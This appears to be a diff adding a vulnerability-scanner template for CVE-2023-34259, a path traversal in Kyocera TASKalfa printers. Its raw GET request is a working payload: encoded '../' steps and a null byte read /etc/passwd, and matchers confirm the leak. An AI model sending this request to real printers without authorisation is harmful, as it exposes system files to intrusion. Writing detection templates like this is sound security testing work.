@@ -1,0 +1,34 @@
+id: cve-2023-34259-path-traversal
+info:
+  name: Kyocera TASKalfa Printer Path Traversal
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: cve, cve2023, path-traversal, printer
+  description: |
+    Kyocera TASKalfa Printer is vulnerable to a path traversal vulnerability, allowing attackers to access sensitive files on the target system.
+
+http:
+  - raw:
+      - |
+        GET /wlmdeu%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd%00index.htm HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin"
+      - type: word
+        part: header
+        words:
+          - "wlmdeu"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
